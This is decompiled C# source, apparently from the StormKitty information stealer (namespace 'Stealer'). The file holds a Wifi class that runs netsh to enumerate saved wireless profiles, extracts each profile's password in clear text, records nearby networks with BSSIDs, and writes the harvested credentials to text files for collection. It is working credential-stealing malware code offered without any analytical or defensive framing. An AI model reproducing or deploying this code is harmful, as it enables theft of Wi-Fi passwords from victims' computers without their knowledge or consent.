using System;
using System.IO;
using System.Linq;
using StormKitty;

namespace Stealer
{
	// Token: 0x02000020 RID: 32
	internal sealed class Wifi
	{
		// Token: 0x060000A2 RID: 162 RVA: 0x00006148 File Offset: 0x00004348
		private static string[] GetProfiles()
		{
			string[] array = CommandHelper.Run("/C chcp 65001 && netsh wlan show profile | findstr All", true).Split(new char[]
			{
				'\r',
				'\n'
			}, StringSplitOptions.RemoveEmptyEntries);
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = array[i].Substring(array[i].LastIndexOf(':') + 1).Trim();
			}
			return array;
		}

		// Token: 0x060000A3 RID: 163 RVA: 0x000061A2 File Offset: 0x000043A2
		private static string GetPassword(string profile)
		{
			return CommandHelper.Run("/C chcp 65001 && netsh wlan show profile name=\"" + profile + "\" key=clear | findstr Key", true).Split(new char[]
			{
				':'
			}).Last<string>().Trim();
		}

		// Token: 0x060000A4 RID: 164 RVA: 0x000061D4 File Offset: 0x000043D4
		public static void ScanningNetworks(string sSavePath)
		{
			string contents = CommandHelper.Run("/C chcp 65001 && netsh wlan show networks mode=bssid", true);
			File.AppendAllText(sSavePath + "\\ScanningNetworks.txt", contents);
		}

		// Token: 0x060000A5 RID: 165 RVA: 0x00006200 File Offset: 0x00004400
		public static void SavedNetworks(string sSavePath)
		{
			foreach (string text in Wifi.GetProfiles())
			{
				if (!text.Equals("65001"))
				{
					Counter.SavedWifiNetworks++;
					string password = Wifi.GetPassword(text);
					string contents = string.Concat(new string[]
					{
						"PROFILE: ",
						text,
						"\nPASSWORD: ",
						password,
						"\n\n"
					});
					File.AppendAllText(sSavePath + "\\SavedNetworks.txt", contents);
				}
			}
		}
	}
}
